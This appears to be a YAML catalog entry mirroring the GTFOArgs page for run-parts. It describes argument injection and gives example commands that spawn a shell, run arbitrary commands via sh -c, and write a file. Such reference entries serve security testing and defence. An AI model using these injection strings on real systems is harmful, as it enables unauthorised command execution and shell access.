---
trust_level: community
id: argument-injection-run-parts
namespace: argument:injection:run-parts
name: run-parts
description: Argument injection via run-parts
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- cross-platform
techniques:
- execution
execution:
  template: run-parts
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Spawn an interactive shell by matching `/bin/sh`.
  command: 'run-parts --new-session --regex ''^sh$'' /bin '
- description: Execute an arbitrary command via `sh -c <cmd>` using `--arg`.
  command: 'run-parts --regex ''^sh$'' --arg -c --arg ''id'' /bin '
- description: Run a command that writes a file (example uses `echo`).
  command: 'run-parts --regex ''^sh$'' --arg -c --arg ''echo pwned > /tmp/owned''
    /bin '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/run-parts/
features:
- pipes-stdin
- process-manip
- stealth
---

# run-parts

GTFOArgs entry for run-parts. This binary can be used to inject arguments for execution, file operations, or other capabilities.
